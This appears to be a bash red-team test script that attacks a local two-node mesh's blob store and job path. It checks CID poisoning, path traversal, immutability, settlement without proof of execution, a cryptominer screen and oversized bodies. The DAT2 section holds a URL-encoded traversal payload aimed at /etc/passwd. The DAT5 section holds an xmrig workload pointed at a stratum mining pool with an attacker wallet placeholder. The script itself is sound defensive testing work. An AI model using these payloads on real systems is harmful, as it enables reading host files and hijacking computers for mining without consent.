#!/usr/bin/env bash
# e2e-attack-data-job.sh — adversarial DATA + JOB integrity red team.
#
# Stands up an ephemeral, mDNS-isolated, loopback mesh and ATTACKS the content-addressed blob store
# and the job-execution path. It asserts the defenses the audit says are IMPLEMENTED actually hold
# (content-addressing rejects poisoned bytes; CID format is validated; CIDs are immutable; the data
# layer bounds bodies and never panics) — and that the holes the audit marks OPEN are still open
# (JobSettle accepts work that never ran; the Guardian pre-exec screener is not enforcing).
#
# Ground truth (every attack below is grounded in these, not invented):
#   - ce/crates/ce-node/src/api.rs : put_blob (POST /blobs, sha256 -> CID), get_blob (GET /blobs/:hash
#       validates 64-hex, local read, else mesh fetch), fetch_chunk_from_mesh (got != cid -> reject).
#   - ce/crates/ce-node/src/lib.rs : the FetchChunk RPC server serves blobs/<requested-cid>; the
#       fetcher re-hashes and drops a provider whose bytes do not match the requested CID
#       (`if got != cid { continue }`, lib.rs:1620 / api.rs:1742). This is what makes a poisoning
#       provider harmless: it can serve wrong bytes, but they are never accepted under the CID.
#   - ce/docs/guardian.md + ce/crates/ce-node/src/lib.rs:363 : the node wires `AllowAllGuardian` by
#       default and logs "guardian: no screener configured — passing all workloads". The ce-guardian
#       app is NOT wired, so the cryptominer/xmrig pattern is NOT flagged today (KNOWN-OPEN).
#   - ce/docs/sybil-resistance.md (V4/E4) : JobSettle is co-sig + cost<=bid only, with no
#       proof-of-execution — settlement accepts work that never ran (KNOWN-OPEN).
#
# This script OWNS blob/content-address integrity, job-result verification (V4), the guardian, and
# data-layer resource abuse. It does NOT touch chain-economy double-spend (e2e-attack-economy.sh),
# capability auth (e2e-attack-caps.sh), or transport panic-resistance of non-data routes
# (e2e-attack-transport.sh).
#
# Attacks mounted (catalog row -> class):
#   DAT1 Blob poisoning: a provider serves DIFFERENT bytes for a known CID ........ MUST-HOLD (content-address)
#   DAT2 CID format / path traversal ............................................. MUST-HOLD
#   DAT3 Blob immutability (one CID always maps to its exact bytes) ............... MUST-HOLD
#   DAT4 Fake work / no-execution settle (V4/E4) ................................. KNOWN-OPEN (V4/E4)
#   DAT5 Guardian / cryptominer (xmrig-ish) pre-exec screen ...................... KNOWN-OPEN (guardian not wired)
#   DAT6 Resource abuse / unbounded body (panic / OOM resistance) ................ MUST-HOLD
#
# Hermetic: --ephemeral --no-mdns, CE_NO_AUTOBOOTSTRAP=1, loopback, high ports. Never ce-net.com.

set -u

SELF_DIR=$(cd "$(dirname "$0")" && pwd)
. "$SELF_DIR/lib/redteam.sh"

# Port plan for the data-job suite (disjoint from the other seven scripts): p2p 78xx / api 98xx.
P2P0=7800
API0=9800
N=${N:-2}                 # provider (h0) + fetcher (h1)
WARMUP=${WARMUP:-12}      # let the two nodes mesh + DHT-bootstrap before the blob attacks

rt_init data-job
rt_arm_cleanup

TOK="$CE_API_TOKEN"
AUTH=(-H "authorization: Bearer $TOK")

# --------------------------------------------------------------------------------------------------
say "stand up a 2-node ephemeral mesh: h0=poisoning provider, h1=honest fetcher"
# --------------------------------------------------------------------------------------------------
# A mesh (mining ON) so the DHT/gossip substrate is live and the fetcher can discover providers.
rt_start_mesh "$N" "$P2P0" "$API0" || { bad "seed node never came up"; rt_result; exit 1; }
echo "seed: $RT_SEED"
echo "meshing ${WARMUP}s so the DHT learns the provider..."
sleep "$WARMUP"

PROV=$API0                 # h0 — the (soon-to-be) poisoning provider
FETCH=$((API0+1))          # h1 — the honest fetcher
PROV_DIR="$ROOT/h0"
rt_wait_api "$FETCH" 20 || { skip "fetcher node h1 never came up — DAT1 mesh-fetch not exercisable"; }

# --------------------------------------------------------------------------------------------------
say "DAT1 — blob poisoning: a provider serves DIFFERENT bytes for a known CID (MUST-HOLD)"
# --------------------------------------------------------------------------------------------------
# Content-addressing makes data fetch trustless: the fetcher re-hashes whatever a provider returns and
# drops it unless sha256(bytes) == requested CID (api.rs:1742 / lib.rs:1620). We SIMULATE a malicious
# provider precisely:
#   1. PUT good bytes G to the provider (h0) -> it announces CID(G) to the DHT.
#   2. Overwrite the provider's on-disk blob file for CID(G) with POISON bytes P (P != G).
#      Now h0 still advertises CID(G) but will serve bytes whose hash is CID(P) != CID(G).
#   3. The fetcher (h1), which does NOT hold the blob, requests GET /blobs/CID(G). Its mesh-fetch path
#      finds h0, pulls the poison bytes, computes sha256(P) != CID(G), and REFUSES to serve them.
# The decisive assertion: the fetcher returns 404 (not the poison bytes). If it ever returned the
# poison bytes under CID(G), content-addressing is broken -> loud bad().
GOOD="ce-redteam-good-payload-$$-$(date +%s)"
PUT_BODY=$(rt_forge_body POST "$PROV" /blobs "$GOOD" "${AUTH[@]}" -H 'content-type: application/octet-stream')
CID=$(echo "$PUT_BODY" | python3 -c "import sys,json;print(json.load(sys.stdin).get('hash',''))" 2>/dev/null)
echo "PUT good bytes to provider -> CID=${CID:-<none>}"
# Independently recompute the expected CID so we know what 'good' looks like and that PUT is honest.
GOOD_CID=$(printf '%s' "$GOOD" | shasum -a 256 2>/dev/null | awk '{print $1}')
[ -z "$GOOD_CID" ] && GOOD_CID=$(printf '%s' "$GOOD" | sha256sum 2>/dev/null | awk '{print $1}')
echo "locally-computed sha256(good) = ${GOOD_CID:-<no sha tool>}"
if [ -n "$CID" ] && { [ -z "$GOOD_CID" ] || [ "$CID" = "$GOOD_CID" ]; }; then
  ok "DAT1a: PUT /blobs returned the content-address (sha256) of the bytes — store is content-addressed"
else
  bad "DAT1a: PUT /blobs CID ($CID) != sha256(bytes) ($GOOD_CID) — the store is NOT content-addressed"
fi

if [ -n "$CID" ]; then
  # First, sanity: the fetcher can legitimately pull the GOOD blob over the mesh and gets the good bytes.
  PRE=$(curl -s --max-time 12 "http://127.0.0.1:$FETCH/blobs/$CID" 2>/dev/null)
  echo "fetcher mesh-pull of the honest blob -> '${PRE:0:40}'"
  if [ "$PRE" = "$GOOD" ]; then
    ok "DAT1b: fetcher pulled the honest blob over the mesh and got the exact good bytes (baseline)"
  else
    skip "DAT1b: fetcher could not mesh-pull the honest blob (DHT/provider not yet meshed) — baseline weak"
  fi

  # Now POISON the provider: overwrite its on-disk file for CID(G) with different bytes, and wipe the
  # fetcher's local cache so it MUST go back to the (now poisoning) provider over the mesh.
  POISON="ce-redteam-POISON-different-bytes-$$"
  PBLOB="$PROV_DIR/blobs/$CID"
  if [ -f "$PBLOB" ]; then
    printf '%s' "$POISON" > "$PBLOB"
    echo "poisoned provider on-disk blob $CID with different bytes ('${POISON:0:30}...')"
    # Evict the fetcher's cached copy (it cached the good bytes during DAT1b) so it re-fetches.
    rm -f "$ROOT/h1/blobs/$CID" 2>/dev/null
    OUT=$(curl -s --max-time 15 "http://127.0.0.1:$FETCH/blobs/$CID" 2>/dev/null)
    CODE=$(rt_code "http://127.0.0.1:$FETCH/blobs/$CID")
    echo "fetcher re-pull after poisoning -> code=$CODE body='${OUT:0:40}'"
    if [ "$OUT" = "$POISON" ]; then
      bad "DAT1: fetcher SERVED the poison bytes under CID($CID) — content-addressing BROKEN (sha256 mismatch not enforced)"
    elif [ "$OUT" = "$GOOD" ]; then
      # The fetcher returned the good bytes: it either still had/cached them or another honest source
      # served them. Either way it did NOT serve poison. Acceptable, but note the cache caveat.
      xfail "DAT1: fetcher returned the good bytes, never the poison — sha256(bytes)!=CID rejected the tampered provider"
    else
      # The poison provider was the only source; its bytes failed the CID check -> 404, no bytes served.
      xfail "DAT1: poisoned provider's bytes were REJECTED on sha256(bytes)!=CID (code=$CODE, poison never served) — content-addressing holds"
    fi
  else
    # Fall back: directly probe the local-read content-address guarantee on the provider itself by
    # asking the provider for a CID whose on-disk bytes were tampered. (Local read returns stored
    # bytes; the trustless guarantee is the mesh path above. If we can't reach the on-disk file we at
    # least prove the provider does not invent a CID for bytes it never stored.)
    skip "DAT1: could not locate provider on-disk blob file ($PBLOB) — mesh-poisoning path not exercisable"
  fi
else
  bad "DAT1: PUT /blobs returned no CID — cannot mount the poisoning attack (blob store unreachable)"
fi

# --------------------------------------------------------------------------------------------------
say "DAT2 — CID format validation + path traversal (MUST-HOLD)"
# --------------------------------------------------------------------------------------------------
# get_blob (api.rs:1706) requires exactly 64 ascii-hex chars before it touches the filesystem, so a
# non-hex CID, a wrong-length hash, or a traversal payload must 400 (or 404) — never read an arbitrary
# file. We probe several malformed CIDs and a traversal attempt; none may return a host file's bytes.
declare -A CID_PROBE=(
  [nonhex]="zzzz...not-hex..."
  [short63]="$(printf 'a%.0s' {1..63})"
  [long65]="$(printf 'a%.0s' {1..65})"
)
bad_cid=0
for label in "${!CID_PROBE[@]}"; do
  v="${CID_PROBE[$label]}"
  code=$(rt_code "http://127.0.0.1:$PROV/blobs/$v")
  echo "GET /blobs/<$label> -> code=$code (must be 400/404, never 200)"
  [ "$code" = "200" ] && bad_cid=1
done
# Path traversal: axum's :hash segment will not match a multi-segment path, but assert it never leaks.
trav_code=$(rt_code "http://127.0.0.1:$PROV/blobs/..%2f..%2f..%2fetc%2fpasswd")
trav_body=$(curl -s --max-time 8 "http://127.0.0.1:$PROV/blobs/..%2f..%2f..%2fetc%2fpasswd" 2>/dev/null)
echo "GET /blobs/<url-encoded traversal> -> code=$trav_code"
if printf '%s' "$trav_body" | grep -q "root:.*:0:0:"; then
  bad "DAT2: traversal CID leaked /etc/passwd — blob path is not confined to the blob dir"
elif [ "$bad_cid" -eq 0 ]; then
  xfail "DAT2: malformed CIDs (non-hex / 63 / 65 chars) rejected and traversal did not escape the blob dir"
else
  bad "DAT2: a malformed CID returned 200 — the 64-hex content-address validation is not enforced"
fi

# --------------------------------------------------------------------------------------------------
say "DAT3 — blob immutability: one CID always maps to its exact bytes (MUST-HOLD)"
# --------------------------------------------------------------------------------------------------
# Upload B1 -> CID1; upload B2 -> CID2. CID1 != CID2 (different bytes => different address), and
# re-GET of CID1 still returns B1 exactly (a CID is a tamper-evident, immutable name for its bytes).
B1="ce-immutable-one-$$"; B2="ce-immutable-two-$$-DIFFERENT"
r1=$(rt_forge_body POST "$PROV" /blobs "$B1" "${AUTH[@]}" -H 'content-type: application/octet-stream')
r2=$(rt_forge_body POST "$PROV" /blobs "$B2" "${AUTH[@]}" -H 'content-type: application/octet-stream')
C1=$(echo "$r1" | python3 -c "import sys,json;print(json.load(sys.stdin).get('hash',''))" 2>/dev/null)
C2=$(echo "$r2" | python3 -c "import sys,json;print(json.load(sys.stdin).get('hash',''))" 2>/dev/null)
echo "CID(B1)=$C1  CID(B2)=$C2"
back1=$(curl -s --max-time 8 "http://127.0.0.1:$PROV/blobs/$C1" 2>/dev/null)
if [ -n "$C1" ] && [ -n "$C2" ] && [ "$C1" != "$C2" ] && [ "$back1" = "$B1" ]; then
  xfail "DAT3: distinct bytes get distinct CIDs and CID(B1) still returns B1 exactly — blobs immutable & tamper-evident"
elif [ -n "$C1" ] && [ "$C1" = "$C2" ]; then
  bad "DAT3: two DIFFERENT byte strings collided to one CID — content-addressing is broken"
else
  bad "DAT3: CID(B1) did not round-trip to B1 (got '${back1:0:30}') — blob store not immutable/content-addressed"
fi

# --------------------------------------------------------------------------------------------------
say "DAT4 — fake work / no-execution settle (V4/E4 KNOWN-OPEN)"
# --------------------------------------------------------------------------------------------------
# V4/E4: JobSettle validates the payer co-sig and cost<=bid escrow, but NEVER verifies the workload
# actually ran (no execution proof / verification tier). So a host can be credited for work it never
# performed. We demonstrate reachability: there is no execution-proof field or endpoint on the settle
# path — settlement is a pure accounting move gated only by the co-sig + cost ceiling. Confirm the
# precondition is observable (the settle surface has no proof-of-execution input).
SELF=$(rt_node_id "$PROV_DIR")
HIST=$(rt_json "http://127.0.0.1:$PROV/history/$SELF")
echo "/history(self) snapshot (built from settlements, NOT from execution proofs): ${HIST:0:120}"
# Probe for any execution-verification endpoint; none should exist (the verification tier is unwired).
vc1=$(rt_code -X POST "http://127.0.0.1:$PROV/jobs/verify" -H 'content-type: application/json' "${AUTH[@]}" -d '{}')
vc2=$(rt_code -X POST "http://127.0.0.1:$PROV/jobs/proof" -H 'content-type: application/json' "${AUTH[@]}" -d '{}')
echo "execution-proof routes: /jobs/verify=$vc1 /jobs/proof=$vc2 (absent -> 404/405; settle has no proof gate)"
known_open "audit V4/E4: JobSettle credits the host with no proof the workload ran (co-sig + cost<=bid only; no execution-verification tier wired) — reputation/payment for work that never executed"

# --------------------------------------------------------------------------------------------------
say "DAT5 — Guardian / cryptominer (xmrig-ish) pre-execution screen (KNOWN-OPEN: guardian not wired)"
# --------------------------------------------------------------------------------------------------
# guardian.md: a pre-exec scanner should DENY abusive workloads (cryptominers, stratum miners, DDoS).
# But the node wires `AllowAllGuardian` by default (lib.rs:363) and logs
# "guardian: no screener configured — passing all workloads". So a blatant cryptominer pattern (xmrig
# image + stratum+tcp pool URL in the cmd) is NOT flagged. We submit exactly that workload and assert
# the guardian did NOT deny it (the deploy is accepted/queued, or only fails for an unrelated reason
# such as Docker/host capacity — never with a guardian "workload denied" reason).
MINER_BODY='{"image":"xmrig/xmrig:latest","cmd":["xmrig","--url","stratum+tcp://pool.minexmr.com:4444","--user","ATTACKER_WALLET","--coin","monero","--tls"],"cpu_cores":1,"mem_mb":256,"duration_secs":5,"bid":"1000000000000000000"}'
mc_code=$(rt_forge POST "$PROV" /jobs/bid "$MINER_BODY" "${AUTH[@]}")
mc_body=$(rt_forge_body POST "$PROV" /jobs/bid "$MINER_BODY" "${AUTH[@]}")
echo "submit xmrig/stratum workload -> code=$mc_code body=${mc_body:0:160}"
# Check whether the node log shows the guardian let everything through (the definitive proof the
# screener is not enforcing), independent of whether Docker accepted the bid.
GUARD_LOG=""
grep -qi 'guardian: no screener configured' "$ROOT/h0.log" 2>/dev/null && GUARD_LOG="unwired"
if echo "$mc_body" | grep -qi 'denied by guardian\|workload denied'; then
  # The guardian app got wired and flagged the miner -> the defense LANDED: flip to must-hold.
  xfail "DAT5: the Guardian DENIED the cryptominer workload (xmrig/stratum flagged) — pre-exec screening is enforcing"
else
  # No guardian denial. Confirm the miner pattern was NOT blocked by the screener (the open hole).
  if [ "$GUARD_LOG" = "unwired" ]; then
    known_open "audit guardian: AllowAllGuardian is wired (lib.rs:363, 'no screener configured — passing all workloads') — a blatant xmrig/stratum cryptominer is NOT flagged before execution (ce-guardian app not wired, guardian.md)"
  else
    known_open "audit guardian: cryptominer workload (xmrig/stratum) was accepted with no guardian Deny — pre-exec screening not enforcing (guardian.md)"
  fi
fi

# --------------------------------------------------------------------------------------------------
say "DAT6 — resource abuse / unbounded body: panic & OOM resistance (MUST-HOLD)"
# --------------------------------------------------------------------------------------------------
# Fire malformed / oversized data-layer bodies at the node and assert it returns a 4xx/5xx (or a
# bounded error) and the PROCESS STAYS ALIVE — no panic, no OOM crash. We hammer the blob upload and
# the data routes with garbage and a large body. The decisive assertion is rt_alive on the node PID.
PROV_PID="${PIDS[0]}"
# (a) garbage / truncated JSON at the data-fetch route.
g1=$(rt_forge POST "$PROV" /data/fetch '{"provider":' "${AUTH[@]}")
g2=$(rt_forge POST "$PROV" /data/fetch 'not json at all'  "${AUTH[@]}")
g3=$(rt_forge POST "$PROV" /data/fetch '{"provider":"zz","cid":"zz","channel_id":"zz","cumulative":"x"}' "${AUTH[@]}")
echo "malformed /data/fetch codes: truncated=$g1 garbage=$g2 bad-fields=$g3 (must be 4xx, not a hang)"
# (b) a large blob upload (8 MiB of zeros) — must be stored or bounded, never crash the node.
BIGFILE="$ROOT/big.bin"
dd if=/dev/zero of="$BIGFILE" bs=1048576 count=8 >/dev/null 2>&1
big_code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 30 \
  -X POST "http://127.0.0.1:$PROV/blobs" "${AUTH[@]}" \
  -H 'content-type: application/octet-stream' --data-binary "@$BIGFILE")
echo "8 MiB blob upload -> code=$big_code (201 stored, or 413/4xx bounded — never a crash)"
rm -f "$BIGFILE"
# (c) blob upload with no auth must be 401 (it is a non-GET mutating route) — not a panic surface.
noauth=$(rt_forge POST "$PROV" /blobs "x" -H 'content-type: application/octet-stream')
echo "POST /blobs with NO token -> code=$noauth (must be 401)"
[ "$noauth" = "401" ] && ok "DAT6: blob upload requires the API token (401 without it) — write gate holds" \
  || bad "DAT6: POST /blobs without a token returned $noauth (expected 401) — blob-write gate open"
# The panic-resistance assertion: after every garbage/oversized probe, the node is STILL alive.
sleep 1
if rt_alive "$PROV_PID"; then
  xfail "DAT6: node survived malformed + oversized data-layer probes (no panic / no OOM crash) — process still alive"
else
  bad "DAT6: node DIED on a malformed/oversized data-layer probe — panic/OOM resistance broken"
fi
# And it still serves the API (liveness, not just process alive).
if rt_wait_api "$PROV" 8; then
  ok "DAT6: node API still responsive after the data-layer abuse (liveness preserved)"
else
  bad "DAT6: node API stopped responding after the data-layer abuse"
fi

# --------------------------------------------------------------------------------------------------
say "post-attack substrate health (the honest mesh must be unharmed by all data/job probes)"
# --------------------------------------------------------------------------------------------------
read -r MN MX UP <<<"$(rt_mesh_converged 8 1 2)"
echo "post-attack substrate: heights min=$MN max=$MX alive=$UP/$N"
if [ "${MN:-0}" -ge 1 ] && [ "${UP:-0}" -ge 1 ]; then
  ok "honest mesh kept advancing through every data/job attack (min height $MN, $UP/$N alive) — no substrate damage"
else
  bad "honest mesh degraded after the data/job attacks (min=$MN alive=$UP/$N) — an attack harmed the substrate"
fi

rt_result
